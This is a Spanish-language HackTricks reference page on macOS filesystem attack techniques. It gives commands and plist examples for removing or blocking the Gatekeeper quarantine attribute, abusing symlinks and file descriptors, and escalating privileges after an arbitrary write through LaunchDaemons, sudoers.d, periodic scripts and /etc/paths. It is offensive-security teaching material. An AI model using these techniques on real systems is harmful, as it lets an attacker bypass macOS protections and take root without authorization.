# Trucos de FS de macOS

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Red Team de AWS de HackTricks)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

## Combinaciones de permisos POSIX

Permisos en un **directorio**:

* **lectura** - puedes **enumerar** las entradas del directorio
* **escritura** - puedes **eliminar/escribir** **archivos** en el directorio y puedes **eliminar carpetas vacías**.&#x20;
* Pero **no puedes eliminar/modificar carpetas no vacías** a menos que tengas permisos de escritura sobre ellas.
* **No puedes modificar el nombre de una carpeta** a menos que la poseas.
* **ejecución** - se te permite **atravesar** el directorio - si no tienes este derecho, no puedes acceder a ningún archivo dentro de él, ni en ningún subdirectorio.

### Combinaciones Peligrosas

**Cómo sobrescribir un archivo/carpeta propiedad de root**, pero:

* Un **propietario de directorio padre** en la ruta es el usuario
* Un **propietario de directorio padre** en la ruta es un **grupo de usuarios** con **acceso de escritura**
* Un **grupo de usuarios** tiene **acceso de escritura** al **archivo**

Con cualquiera de las combinaciones anteriores, un atacante podría **inyectar** un **enlace simbólico/duro** en la ruta esperada para obtener una escritura arbitraria privilegiada.

### Caso Especial de R+X de la raíz de la carpeta

Si hay archivos en un **directorio** donde **solo root tiene acceso de R+X**, estos **no son accesibles para nadie más**. Por lo tanto, una vulnerabilidad que permita **mover un archivo legible por un usuario**, que no se puede leer debido a esa **restricción**, desde esta carpeta **a otra diferente**, podría ser abusada para leer estos archivos.

Ejemplo en: [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions)

## Enlace Simbólico / Enlace Duro

Si un proceso privilegiado está escribiendo datos en un **archivo** que podría ser **controlado** por un **usuario menos privilegiado**, o que podría ser **creado previamente** por un usuario menos privilegiado. El usuario simplemente podría **apuntarlo a otro archivo** a través de un enlace simbólico o duro, y el proceso privilegiado escribirá en ese archivo.

Ver en las otras secciones dónde un atacante podría **abusar de una escritura arbitraria para escalar privilegios**.

## .fileloc

Los archivos con extensión **`.fileloc`** pueden apuntar a otras aplicaciones o binarios, por lo que cuando se abren, la aplicación/binario será la que se ejecute.\
Ejemplo:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## FD Arbitrario

Si puedes hacer que un **proceso abra un archivo o una carpeta con altos privilegios**, puedes abusar de **`crontab`** para abrir un archivo en `/etc/sudoers.d` con **`EDITOR=exploit.py`**, de esta manera `exploit.py` obtendrá el FD al archivo dentro de `/etc/sudoers` y lo abusará.

Por ejemplo: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)

## Trucos para Evitar las Atributos Extendidos de Cuarentena

### Eliminarlo
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### Bandera uchg / uchange / uimmutable

Si un archivo/carpeta tiene este atributo inmutable, no será posible ponerle un xattr.
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### Montaje de defvfs

Un montaje de **devfs** **no admite xattr**, más información en [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### ACL de writeextattr

Este ACL evita agregar `xattrs` al archivo.
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

El formato de archivo **AppleDouble** copia un archivo incluyendo sus ACEs.

En el [**código fuente**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) es posible ver que la representación de texto de ACL almacenada dentro del xattr llamado **`com.apple.acl.text`** se establecerá como ACL en el archivo descomprimido. Por lo tanto, si comprimiste una aplicación en un archivo zip con el formato de archivo **AppleDouble** con un ACL que evita que otros xattrs se escriban en él... el xattr de cuarentena no se estableció en la aplicación:

Consulta el [**informe original**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) para obtener más información.

Para replicar esto primero necesitamos obtener la cadena de acl correcta:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Note that even if this works the sandbox write the quarantine xattr before)

No es realmente necesario, pero lo dejo ahí por si acaso:

{% content-ref url="macos-xattr-acls-extra-stuff.md" %}
[macos-xattr-acls-extra-stuff.md](macos-xattr-acls-extra-stuff.md)
{% endcontent-ref %}

## Bypass de Firmas de Código

Los paquetes contienen el archivo **`_CodeSignature/CodeResources`** que contiene el **hash** de cada **archivo** en el **paquete**. Ten en cuenta que el hash de CodeResources también está **incrustado en el ejecutable**, por lo que no podemos manipularlo.

Sin embargo, hay algunos archivos cuya firma no se verificará, estos tienen la clave omit en el plist, como:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
Es posible calcular la firma de un recurso desde la línea de comandos con:

{% code overflow="wrap" %}
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## Montar dmgs

Un usuario puede montar un dmg personalizado incluso encima de algunas carpetas existentes. Así es como podrías crear un paquete dmg personalizado con contenido personalizado:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
{% endcode %}

## Escrituras Arbitrarias

### Scripts sh periódicos

Si tu script pudiera ser interpretado como un **script de shell**, podrías sobrescribir el script de shell **`/etc/periodic/daily/999.local`** que se activará todos los días.

Puedes **simular** una ejecución de este script con: **`sudo periodic daily`**

### Demonios

Escribe un **LaunchDaemon** arbitrario como **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** con un plist ejecutando un script arbitrario como:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
### Archivo Sudoers

Si tienes **escritura arbitraria**, podrías crear un archivo dentro de la carpeta **`/etc/sudoers.d/`** otorgándote privilegios de **sudo**.

### Archivos PATH

El archivo **`/etc/paths`** es uno de los principales lugares que populan la variable de entorno PATH. Debes ser root para sobrescribirlo, pero si un script de un **proceso privilegiado** está ejecutando algún **comando sin la ruta completa**, podrías **secuestrarlo** modificando este archivo.

&#x20;También puedes escribir archivos en **`/etc/paths.d`** para cargar nuevas carpetas en la variable de entorno `PATH`.

## Referencias

* [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/)

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
